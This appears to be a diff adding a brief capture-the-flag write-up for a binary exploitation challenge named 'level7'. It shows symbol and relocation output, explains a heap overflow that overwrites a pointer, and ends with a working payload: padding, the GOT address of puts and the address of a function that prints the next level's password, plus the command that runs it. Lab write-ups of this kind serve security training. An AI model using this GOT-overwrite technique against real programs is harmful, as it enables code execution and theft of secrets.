@@ -1,0 +1,29 @@
+
+#> nm
+08049960 B c
+08048521 T main
+080484f4 T m
+
+#> objdump -R level7
+08049928 R_386_JUMP_SLOT   puts@GLIBC_2.0
+
+There are 4 mallocs(8) p1, s1, p2, s2
+p1[1] = s1
+p2[2] = s2
+strcpy(p1[1], argv[1])
+strcpy(p2[1], argv[2])
+
+Overflowing s1 will rewrite the address contained in p2[1].
+Thus the next call to strcpy will copy argv[2] where we want.
+
+level8/.pass is loaded in global c.
+<m> prints c
+
+Overflow will write address of puts in the .got section
+The second argument is simply <m>'s address
+
+Thus:
+print "A"*20 + "\x28\x99\x04\x08" + " " + "\xf4\x84\x04\x08"
+
+./level7 $(python HoF.py)
+
